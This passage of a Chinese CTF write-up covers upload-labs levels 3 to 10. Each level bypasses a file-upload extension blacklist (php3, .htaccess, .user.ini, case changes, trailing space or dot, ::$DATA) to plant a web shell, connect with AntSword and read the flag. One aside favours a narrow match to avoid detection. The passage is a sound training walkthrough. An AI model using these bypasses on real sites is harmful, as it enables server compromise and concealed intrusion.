脚本执行（兼容性考量）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#/etc/apache2/mods-enabled/php5.conf</span><br><span class="line">&lt;FilesMatch &quot;.+\.ph(p[345]?|t|tml)$&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">&lt;FilesMatch &quot;.+\.phps$&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php-source</span><br><span class="line">    # Deny access to raw php sources by default</span><br><span class="line">    # To re-enable it&#x27;s recommended to enable access to the files</span><br><span class="line">    # only in specific virtual host or directory</span><br><span class="line">    Require all denied</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><div align="right"><a src="https://github.com/monstra-cms/monstra/issues/429">来自 GitHub</a></div></blockquote><p>从上方的正则表达式中可以看出，在 <code>php5 module for apache2(libapache2-mod-php5)</code> 中后缀名为 <kbd>.php</kbd>、<kbd>.php3</kbd>、<kbd>.php4</kbd>、<kbd>.php5</kbd>、<kbd>.pht</kbd>、<kbd>.phtml</kbd>、<kbd>.phps</kbd> 的文件都会被解析为 <kbd>php</kbd> 文件。</p><p>当然，这只是一个特殊版本的例子，事实上我们并不知道靶机网站是什么版本的。但是我们可以参考这个修改我们的木马文件后缀名为上述其一，大部分情况修改为 <kbd>php3</kbd> 即可。</p></li><li><p>直接修改备好的木马文件：</p><img src="https://bu.dusays.com/2022/05/09/6278b0337dbbe.webp" alt="" style="zoom:75%"></li><li><p>上传，成功！</p><img src="https://bu.dusays.com/2022/05/09/6278b034494fc.webp" alt="" style="zoom:75%"></li></ul><h3 id="夺旗-2">夺旗</h3><ul><li><p>蚁剑添加</p><img src="https://bu.dusays.com/2022/05/09/6278b035a0bd6.webp" alt="" style="zoom:75%"><p>不难看出，第三关不再保留我们的文件名了，因此我不需要再对中文进行编码了。</p></li><li><p>既然已经进来了，就不急着夺旗，先看看他到底支持哪些 <kbd>php</kbd> 后缀名。访问下方文件 <code>/var/www/html/docker/docker-php.conf</code></p><img src="https://bu.dusays.com/2022/05/09/6278b0368b390.webp" alt="" style="zoom:75%"> <img src="https://bu.dusays.com/2022/05/09/6278b037b16a0.webp" alt="" style="zoom:75%"><p>因此，只支持 <kbd>php</kbd>、<kbd>php3</kbd>、<kbd>phtml</kbd> 三种！（当然这仅代表我所使用的靶机仅支持这三种。）</p></li><li><p>满足了好奇心之后，便直接根目录夺旗吧！</p><img src="https://bu.dusays.com/2022/05/09/6278b038b01c1.webp" alt="" style="zoom:75%"></li></ul><h2 id="Pass-04">Pass-04</h2><h3 id="启动靶机-14">启动靶机</h3><ul><li><p>熟悉的页面：</p><img src="https://bu.dusays.com/2022/05/09/6278b039b8f36.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究界面-2">研究界面</h3><ul><li><p>直接上传木马文件，提示错误：此文件不允许上传！</p><img src="https://bu.dusays.com/2022/05/09/6278b03a9d262.webp" alt="" style="zoom:75%"></li><li><p>小白依然理直气壮看提示：</p><img src="https://bu.dusays.com/2022/05/09/6278b03bddbd7.webp" alt="" style="zoom:75%"><p>好家伙一口气把这么多后缀名都给拉黑了，因此第三关的方法就不适用了。</p></li><li><p>查看源码，可以发现和第三关一样，依旧屏蔽了大小写：</p><img src="https://bu.dusays.com/2022/05/09/6278b04438013.webp" alt="" style="zoom:75%"></li><li><p>根据上一关的思路，有没有可能让后缀名为 <kbd>.jpg</kbd> 、 <kbd>.png</kbd> 之类的图片文件或者其他文件也被解析为 <kbd>.php</kbd> 脚本呢？</p><p>可以使用 <kbd>.htaccess</kbd> ，即所谓的分布式配置文件，我们可以通过这个文件传输指令，将伪装成图片的木马文件解析成 <kbd>php</kbd> 脚本。值得注意的是，<kbd>.htaccess</kbd> 的作用域在文件所在目录及其所有子目录，而我们上传的所有文件都会在同一目录，此外该后缀名也不在黑名单中，因此完全可用！</p></li></ul><h3 id="突破限制-5">突破限制</h3><ul><li><p>要使用 <kbd>.htaccess</kbd> 文件实现攻击，首先我们需要了解部分指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .h-t-m</span><br><span class="line"># 将后缀名为 h-t-m 的文件解析为 php 脚本执行</span><br><span class="line"></span><br><span class="line">AddHandler php5-script .h-t-m</span><br><span class="line"># 将后缀名为 h-t-m 的文件用 php处理器 来处理，效果同上</span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"># 将所有文件解析为 php 脚本执行</span><br></pre></td></tr></table></figure><p>此外，还有部分标签：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;h-t-m&quot;&gt;</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"># 文件匹配，引号中为正则表达式，匹配成功则执行内部指令</span><br><span class="line"></span><br><span class="line">&lt;IfModule 模块名&gt;</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"># 当指定模块开启时，内部指令执行</span><br></pre></td></tr></table></figure></li><li><p>上述两种标签都可以使用，文件匹配就匹配上传的木马文件名即可，而模块检测可以检测 <kbd>mime-module</kbd> 即可，这个模块执行 <kbd>MIME</kbd> 相关内容，在第二关我们知道要打开一个文件就要检测 <kbd>MIME</kbd> 然后匹配对应处理器，而这正适用于这里。推荐使用文件匹配（精确具体文件名）的方式，尽可能对网站的影响减到最小，<psw>避免入侵被发现</psw>。</p><p>使用文件匹配标签时，指令对象只会是我们所指定的对象，因此 <kbd>.htaccess</kbd> 内容可以如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;木马.h-t-m&quot;&gt;</span><br><span class="line">	SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>我们将木马文件名修改为 <kbd>木马.h-t-m</kbd>，虽然这不是正确的后缀名，但是显然只要在黑名单之外的均可。</p></li><li><p>准备好两个文件，木马文件直接修改后缀名为 <kbd>.h-t-m</kbd> ，配置文件内输入上述指令且保证文件名为 <kbd>.htaccess</kbd> 即可。</p><img src="https://bu.dusays.com/2022/05/09/6278b03cb30ff.webp" alt="" style="zoom:75%"></li><li><p>上传至靶机，自然是成功了的：</p><img src="https://bu.dusays.com/2022/05/09/6278b03dca9cf.webp" alt="" style="zoom:75%"></li></ul><h3 id="夺旗-3">夺旗</h3><ul><li><p>蚁剑添加，然后成功进入</p><img src="https://bu.dusays.com/2022/05/09/6278b03eacb88.webp" alt="" style="zoom:75%"></li><li><p>根目录夺旗</p><img src="https://bu.dusays.com/2022/05/09/6278b03fc77d8.webp" alt="" style="zoom:75%"></li></ul><h2 id="Pass-05">Pass-05</h2><h3 id="启动靶机-15">启动靶机</h3><ul><li><p>更改靶机环境，本关为后补，因此 Pass-6 和 Pass-07 其实是原环境的 Pass-05 和 Pass-06 ，请忽略截图可能带来的题号不匹配。</p><img src="https://bu.dusays.com/2022/05/09/6278b059aff98.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究界面-3">研究界面</h3><ul><li><p>查看提示，看不懂~</p><img src="https://bu.dusays.com/2022/05/09/6278b05a91f47.webp" alt="" style="zoom:75%"></li><li><p>本关一开始我当作第十关解了，虽然确实很像，而且第十关的解法也适用于这几关，但是显然 Pass-05 应该有自己的漏洞。</p></li><li><p>仔细观察黑名单，会发现后面几关的黑名单都比这一关多了一个 <kbd>.ini</kbd>，也就是说，这一关的漏洞应该与第四关类似的上传两个文件越过检查。<psw>可算是明白为啥要把这一关添加到这里了！</psw></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line"><span class="comment"># 后面关卡的黑名单列表</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="突破限制-6">突破限制</h3><ul><li><kbd>php.ini</kbd> 是 <kbd>php</kbd> 的配置文件，<kbd>.user.ini</kbd> 中的字段也会被 <kbd>php</kbd> 视为配置文件来处理，从而导致 <kbd>php</kbd> 的文件解析漏洞。因此 <kbd>.ini</kbd> 实际上屏蔽的就是 <kbd>.user.ini</kbd> 文件，与上一关的 <kbd>.htaccess</kbd> 一样作为配置文件，而且 <kbd>.user.ini</kbd> 的用途更广。主要有这两条指令：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=<span class="number">520</span>.h-t-m <span class="comment">//在页面顶部加载520.h-t-m文件</span></span><br><span class="line">auto_append_file=<span class="number">520</span>.h-t-m  <span class="comment">//在页面底部加载520.h-t-m文件</span></span><br></pre></td></tr></table></figure><p>其实就是会将文件内容包含进 <kbd>php</kbd> 文件中再运行。而要达到这个目的，还需要三个前提条件：</p><ol><li>服务器脚本语言为 <kbd>PHP</kbd></li><li>服务器使用CGI／FastCGI模式</li><li>上传目录下要有可执行的php文件</li></ol></li><li><p>现在应该就不难理解提示里的那句：上传目录存在 php 文件（readme.php）。也就是说，环境已经构建好，就等着传文件入侵了！</p></li><li><p>准备文件：创建 <kbd>.user.ini</kbd> 文件，内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=<span class="number">520</span>.h-t-m</span><br></pre></td></tr></table></figure><p>修改木马文件的文件名为 <kbd>520.h-t-m</kbd>：</p><img src="https://bu.dusays.com/2022/05/11/627bd80672fe9.webp" alt="" style="zoom:75%"></li><li><p>上传二位，成功！</p><img src="https://bu.dusays.com/2022/05/11/627bd7f6c0384.webp" alt="" style="zoom:75%"></li></ul><h3 id="夺旗-4">夺旗</h3><ul><li><p>蚁剑连接，这里需要注意的是，<kbd>.uesr.ini</kbd> 的作用是将目标文件嵌入既有 <kbd>php</kbd> 文件中执行，因此我们连接时就得连接到既有的 <kbd>php</kbd> 文件中，这里就是提示中所说的 <kbd>readme.php</kbd> 文件。</p><img src="https://bu.dusays.com/2022/05/11/627bd7f904f2c.webp" alt="" style="zoom:75%"><p>很好，返回数据为空，行动失败！</p></li></ul><h3 id="问题探究">问题探究</h3><ul><li><p>返回数据为空意味着可以连接到文件但是文件无效，也就是一句话木马并没有加入到 <kbd>readme.php</kbd> 文件中。看来得检验一下环境！</p></li><li><p>通过其他关卡上传一句话木马其中包含语句 <kbd>phpinfo();</kbd> 也就是返回当前服务器得 <kbd>php</kbd> 版本等相关信息，可以看到结果如下：</p><img src="https://bu.dusays.com/2022/05/11/627bd7faaf6ec.webp" alt="" style="zoom:75%"><p>可以确定服务器是使用CGI／FastCGI模式，也就是理论上上述的三大前提都符合，木马不应该没有嵌入才对。</p></li><li><p>在 <kbd>php</kbd> 的手册中，有这么一句话</p><blockquote><p>自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件<em>仅</em>被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用 .htaccess 文件有同样效果。</p><div align="right">——<a src="https://php.golaravel.com/configuration.file.per-user.html">php中文手册</a></div></blockquote></li><li><p>也就是说，版本太低了！</p><p>还是老老实实本地搭建靶机，虽然没有夺旗的乐趣，但毕竟自力更生才能走得长远。不过后续的关卡还是优先在 BUU 上完成。</p></li></ul><h3 id="再次突破">再次突破</h3><ul><li><p>本地部署并且上传完成后，蚁剑连接，完美！</p><img src="https://bu.dusays.com/2022/05/11/627bd7fc623d5.webp" alt="" style="zoom:75%"></li><li><p>于是我就成功入侵了自己的电脑，果然还是入侵别人的靶机有意思~</p></li></ul><h2 id="Pass-06">Pass-06</h2><h3 id="启动靶机-16">启动靶机</h3><ul><li><p>再次回到起点，一切还是那么熟悉</p><img src="https://bu.dusays.com/2022/05/09/6278b04115119.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究界面-4">研究界面</h3><ul><li><p>先拿第四关的文件上传一遍，发现 <kbd>木马.h-t-m</kbd> 文件上传成功了，但是 <kbd>.htaccess</kbd> 文件被阻止了：</p><img src="https://bu.dusays.com/2022/05/09/6278b04266c0f.webp" alt="" style="zoom:75%"> <img src="https://bu.dusays.com/2022/05/09/6278b0434423b.webp" alt="" style="zoom:75%"><p>不难看出，难度升级，配置文件也不能用了。</p></li><li><p>那就再从源码下手，在前面关卡中我们有提到屏蔽大小写，而这一关的代码中，那一句代码却没了：</p><img src="https://bu.dusays.com/2022/05/09/6278b04529987.webp" alt="" style="zoom:75%"><p>这样的话，问题就简单了。</p></li></ul><h3 id="突破限制-7">突破限制</h3><ul><li><p>直接修改后缀名，改成大写的</p><img src="https://bu.dusays.com/2022/05/09/6278b0460a38d.webp" alt="" style="zoom:75%"></li><li><p>上传至靶机，成功！</p><img src="https://bu.dusays.com/2022/05/09/6278b046c7f44.webp" alt="" style="zoom:75%"></li></ul><h3 id="夺旗-5">夺旗</h3><ul><li><p>蚁剑连接</p><img src="https://bu.dusays.com/2022/05/09/6278b04805796.webp" alt="" style="zoom:75%"><p>有趣的是，这一关又是会对上传的文件自动编号的。</p></li><li><p>根目录夺旗</p><img src="https://bu.dusays.com/2022/05/09/6278b0491dd3e.webp" alt="" style="zoom:75%"></li></ul><h2 id="Pass-07">Pass-07</h2><h3 id="启动靶机-17">启动靶机</h3><ul><li><p>再次回到起点，加油网安人</p><img src="https://bu.dusays.com/2022/05/09/6278b04a31b26.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究界面-5">研究界面</h3><ul><li><p>上传第六关文件测试，果然失败了。</p><img src="https://bu.dusays.com/2022/05/09/6278b04b144d9.webp" alt="" style="zoom:75%"></li><li><p>查看提示，变化不大，但是却没有拉黑 <kbd>.htaccess</kbd> 文件。</p><img src="https://bu.dusays.com/2022/05/09/6278b04c4b51e.webp" alt="" style="zoom:75%"><p>不过可以认为这只是个 bug ，因为在源码中，可以看到 <kbd>.htaccess</kbd> 文件是在黑名单中的：</p><img src="https://bu.dusays.com/2022/05/09/6278b04d2f290.webp" alt="" style="zoom:75%"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>继续查看源码，与前面几关的源码对比，很容易能看出这次少了另一行代码：</p><img src="https://bu.dusays.com/2022/05/09/6278b04e011d0.webp" alt="" style="zoom:75%"><p>少的就是这行首尾去空的代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="突破限制-8">突破限制</h3><ul><li><p>要利用这行缺失代码所带来的漏洞，我们先要知道他是干什么的。</p><p>正如注释所言，<kbd>trim()</kbd> 函数的作用就是去除字符串两端的空白字符。头部的空白字符很难对我们产生影响，但是尾部就涉及到了后缀名的内容。当后缀名为 <kbd>.php[]</kbd> 时（ <kbd>[]</kbd> 表示空白字符），他显然是不能与黑名单中的任一后缀匹配上的，由于是空白字符，因此大小写屏蔽也无影响。也就是说，如果我们的文件后缀名为 <kbd>.php[]</kbd> 时，入侵将不受任何影响<psw>？</psw></p></li><li><p>当然，如果想直接上传尾部带空格的文件也是不可能的，因为操作系统会自动忽略首位空白字符，因此，这里需要抓包！</p></li><li><p>在 <kbd>Burp Suite</kbd> 中打开靶机，直接上传备好的木马文件，抓包并在上传的文件名末尾加上一个空格。</p><img src="https://bu.dusays.com/2022/05/09/6278b04e011d0.webp" alt="" style="zoom:75%"></li><li><kbd>Forward</kbd> 之后就可以看到文件已经上传成功。 <img src="https://bu.dusays.com/2022/05/09/6278b0507722c.webp" alt="" style="zoom:75%"></li></ul><h3 id="夺旗-6">夺旗</h3><ul><li><p>蚁剑连接，然后出问题。</p><img src="https://bu.dusays.com/2022/05/09/6278b052176c1.webp" alt="" style="zoom:75%"></li></ul><h3 id="问题探究-2">问题探究</h3><ul><li><p>然而无论怎么试，始终都无法成功连接，甚至直接通过浏览器访问文件，也显示 <kbd>NOT FOUND</kbd> 。通过其他关卡访问后台，可以发现我们上传的文件是存在的：</p><img src="https://bu.dusays.com/2022/05/09/6278b054cce14.webp" alt="" style="zoom:75%"><p>并且打开之后的内容也没有变：</p><img src="https://bu.dusays.com/2022/05/09/6278b053a87b1.webp" alt="" style="zoom:75%"></li><li><p>这里有个小细节，文件图标不一样，有效的脚本文件为第二个，而本关上传的文件为第一个，因此，我们所上传的这个文件并没有被解释为 <kbd>php</kbd> 脚本。</p><img src="https://bu.dusays.com/2022/05/09/6278b055a444e.webp" alt="" style="zoom:75%"></li><li><p>可能出问题的地方只有空格，我们在 URL 后加上 <kbd>%20</kbd> （代表空格）并在浏览器中访问，可以访问，而且在浏览器中显示了文本。</p><img src="https://bu.dusays.com/2022/05/09/6278b0566bcbb.webp" alt="" style="zoom:75%"></li><li><kbd>php</kbd> 指令在浏览器中不会显示，因此我们所上传的 <kbd>.php[]</kbd> 后缀的文件仅被解析为文本文件，而文本文件没有任何作用。</li><li><p>有一个前提被忽略了，后缀添加空格的漏洞<strong>仅适用于 Windows 系统</strong>。而靶机建立在 Linux 系统中，因此，这个漏洞在这不成立！由于 <a target="_blank" rel="noopener" href="https://buuoj.cn/">BUUCTF</a> 提供了 Windows 版本的靶机，因此这里直接换用，之后的关卡也将尽量基于 Windows 版本。</p></li></ul><h3 id="再次夺旗">再次夺旗</h3><ul><li><p>换了系统版本并再次上传文件后，蚁剑连接！</p><img src="https://bu.dusays.com/2022/05/09/6278b05747bb9.webp" alt="" style="zoom:75%"><p>这里需要注意的一点是，编码器不能使用 <kbd>default</kbd> 了，测试时貌似被 WAF 给抓了，因此这里使用 <kbd>base64</kbd> 。</p></li><li><p>根目录夺旗，有一说一 Windows 的根目录还是熟悉一点，<psw>非常乱！</psw>，但是这文件名~</p><img src="https://bu.dusays.com/2022/05/09/6278b058771e5.webp" alt="" style="zoom:75%"></li></ul><h2 id="Pass-08">Pass-08</h2><h3 id="启动靶机-18">启动靶机</h3><ul><li><p>再次回到开始，熟悉的界面。</p><img src="https://bu.dusays.com/2022/05/09/6278b00ea80cf.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究界面-6">研究界面</h3><ul><li><p>直接看源码，依然是关键部分少了一句：</p><img src="https://bu.dusays.com/2022/05/11/627bd807c9465.webp" alt="" style="zoom:75%"><p>删除了这句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br></pre></td></tr></table></figure></li><li><p>该语句负责删除文件名末尾无效的点，也就是说，如果后缀名为 <kbd>.php.</kbd> 的话，将不会被黑名单命中，且由于 Windows 自动忽略末尾无效点，应脚本依然能够被正确执行！</p></li><li><p>值得注意的是由于后续语句都基于最后一个点所提取出来的后缀名做的操作，而该语句的删除也导致后缀名提取为空，即 <kbd>.php.</kbd> 中最后一个点后面所接的后缀名为空。因此，只要上传文件的文件名以点结尾，所有的后续操作都将无效。</p></li></ul><h3 id="突破限制-9">突破限制</h3><ul><li><p>在 <kbd>BurpSuite</kbd> 中打开靶机，上传文件抓包修改文件名，只需要在最后加上一个点即可：</p><img src="https://bu.dusays.com/2022/05/11/627bd80981451.webp" alt="" style="zoom:75%"></li><li><kbd>Forward</kbd> 之后，上传成功！ <img src="https://bu.dusays.com/2022/05/11/627bd7e2bced4.webp" alt="" style="zoom:75%"></li></ul><h3 id="夺旗-7">夺旗</h3><ul><li><p>蚁剑连接</p><img src="https://bu.dusays.com/2022/05/11/627bd7ec1db5c.webp" alt="" style="zoom:75%"><p>当然，末尾不要带点（就是因为 Windows 会把无效点舍去才会有这个漏洞），编码器也不要用默认的。</p></li><li><p>根目录夺旗</p><img src="https://bu.dusays.com/2022/05/11/627bd7e2f2a82.webp" alt="" style="zoom:75%"></li></ul><h2 id="Pass-09">Pass-09</h2><h3 id="启动靶机-19">启动靶机</h3><ul><li><p>继续继续，第九关了！</p><img src="https://bu.dusays.com/2022/05/11/627bd7e592a21.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究界面-7">研究界面</h3><ul><li><p>不多废话，直接看源码，根据前几关的经验，该轮到 <kbd>::&#36;DATA</kbd> 了。源码中果然少了那句。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure><img src="https://bu.dusays.com/2022/05/11/627bd7ea4a317.webp" alt="" style="zoom:75%"></li><li><p>关于 <kbd>::&#36;DATA</kbd> 的作用，在 Windows 系统中只会以 <kbd>::&#36;DATA</kbd> 前的数据当作文件名。因此，如果文件名为 <kbd>h-t-m.php::&#36;DATA</kbd> 则后缀名不会与黑名单匹配，但是系统也依然会正确执行！</p></li></ul><h3 id="突破限制-10">突破限制</h3><ul><li><p>在 <kbd>BurpSuite</kbd> 中打开靶机，上传文件抓包修改文件名，只需要在最后加上 <kbd>::&#36;DATA</kbd> 即可：</p><img src="https://bu.dusays.com/2022/05/11/627bd7ef7b929.webp" alt="" style="zoom:75%"></li><li><kbd>Forward</kbd> 之后，上传成功！ <img src="https://bu.dusays.com/2022/05/11/627bd7f1259bd.webp" alt="" style="zoom:75%"></li></ul><h3 id="夺旗-8">夺旗</h3><ul><li><p>蚁剑连接</p><img src="https://bu.dusays.com/2022/05/11/627bd7f21daae.webp" alt="" style="zoom:75%"><p>当然，<kbd>::&#36;DATA</kbd> 是要被忽略的，所以连接时不要加上 <kbd>::&#36;DATA</kbd> 。</p></li><li><p>根目录夺旗</p><img src="https://bu.dusays.com/2022/05/11/627bd7f4d5172.webp" alt="" style="zoom:75%"></li></ul><h2 id="Pass-10">Pass-10</h2><h3 id="启动靶机-20">启动靶机</h3><ul><li><p>再次回到这里</p><img src="https://bu.dusays.com/2022/05/09/6278b00ea80cf.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究页面-6">研究页面</h3><ul><li><p>直接查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span 